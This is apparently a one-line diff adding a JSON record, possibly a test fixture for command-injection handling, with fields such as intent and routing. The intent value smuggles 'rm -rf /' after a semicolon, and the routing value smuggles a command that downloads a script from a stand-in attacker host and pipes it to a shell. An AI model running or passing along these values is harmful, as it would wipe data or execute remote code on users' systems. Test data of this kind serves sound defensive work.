@@ -1,0 +1,1 @@
+{"intent": "fix the build; rm -rf / #", "tier": "standard", "budget": "small", "routing": "core; $(curl evil.example/x | sh)"}
